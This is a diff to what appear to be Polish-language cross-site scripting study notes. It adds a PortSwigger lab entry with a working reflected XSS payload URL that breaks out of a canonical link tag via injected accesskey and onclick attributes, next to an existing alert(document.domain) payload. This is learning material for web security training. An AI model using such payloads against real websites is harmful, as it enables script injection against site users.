@@ -205,6 +205,12 @@ ${alert(document.domain)}
 ```
 Źródło: https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
 
+Lab: Reflected XSS in canonical link tag
+1. Link wpisywany jest w canonical tag: `<link rel="canonical" href="http://example.com/">`
+Payload:
+```url
+https://0a71005c041e3653c08e355d00090032.web-security-academy.net/post?postId=4&a=4%27accesskey%3d%27X%27onclick%3d%27alert(1)
+```
 
 # DOM BASED XSS 
 
